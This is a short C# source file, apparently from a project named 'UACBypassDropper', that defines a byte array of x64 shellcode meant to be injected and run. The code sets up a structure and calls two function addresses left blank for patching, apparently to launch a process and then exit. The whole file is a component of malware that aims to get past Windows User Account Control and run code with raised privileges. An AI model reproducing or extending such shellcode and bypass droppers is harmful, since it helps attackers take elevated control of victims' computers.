﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace UACBypassDropper
{
    internal class Shellcode
    {
        public static readonly byte[] Payload = new byte[]
        {
            0x49, 0x89, 0xE3, 0x48, 0x81, 0xEC, 0xE8, 0x00, 0x00, 0x00, 0x0F, 0x57,
            0xC0, 0x48, 0x8D, 0x0D, 0x75, 0x00, 0x00, 0x00, 0x31, 0xC0, 0x45, 0x31,
            0xC9, 0x0F, 0x11, 0x44, 0x24, 0x54, 0x45, 0x31, 0xC0, 0x31, 0xD2, 0x0F,
            0x11, 0x44, 0x24, 0x64, 0x0F, 0x11, 0x44, 0x24, 0x74, 0x41, 0x89, 0x43,
            0xCC, 0x49, 0x8D, 0x43, 0xD8, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x8D,
            0x44, 0x24, 0x50, 0x48, 0x89, 0x44, 0x24, 0x40, 0x31, 0xC0, 0x48, 0x89,
            0x44, 0x24, 0x38, 0x48, 0x89, 0x44, 0x24, 0x30, 0x89, 0x44, 0x24, 0x28,
            0x41, 0x0F, 0x11, 0x43, 0x9C, 0x89, 0x44, 0x24, 0x20, 0x41, 0x0F, 0x11,
            0x43, 0xAC, 0x41, 0x0F, 0x11, 0x43, 0xBC, 0xC7, 0x44, 0x24, 0x50, 0x68,
            0x00, 0x00, 0x00, 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0xFF, 0xD0, 0x31, 0xC9, 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0xFF, 0xD0
        };
    }
}
